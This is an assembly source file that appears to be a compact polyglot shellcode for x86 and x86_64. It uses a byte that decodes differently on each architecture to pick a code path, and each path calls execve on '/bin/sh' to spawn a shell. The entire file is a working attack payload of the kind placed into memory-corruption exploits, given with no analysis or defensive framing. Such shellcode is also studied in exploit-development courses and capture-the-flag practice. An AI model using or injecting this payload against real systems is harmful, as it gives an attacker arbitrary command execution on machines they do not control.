BITS	64

	xor	rax, rax
	push	rax
	push	rax
	pop	rdx
	jmp	cmd
continue:
	pop	rdi
	push	rdi
	push	rsp
	db	0x40 ; REX prefix ignored by x86_64, "dec eax" in x86
	jnz	x86

	; 64-bit exclusive code
	mov	al, 59
	pop	rsi
	syscall

x86:
BITS	32
	; 32-bit exclusive code
	mov	al, 0xb
	mov	ebx, edi
	pop	ecx
	int	0x80

cmd:
	call continue ; this pushes the address of "/bin/sh"
	db "/bin/sh"
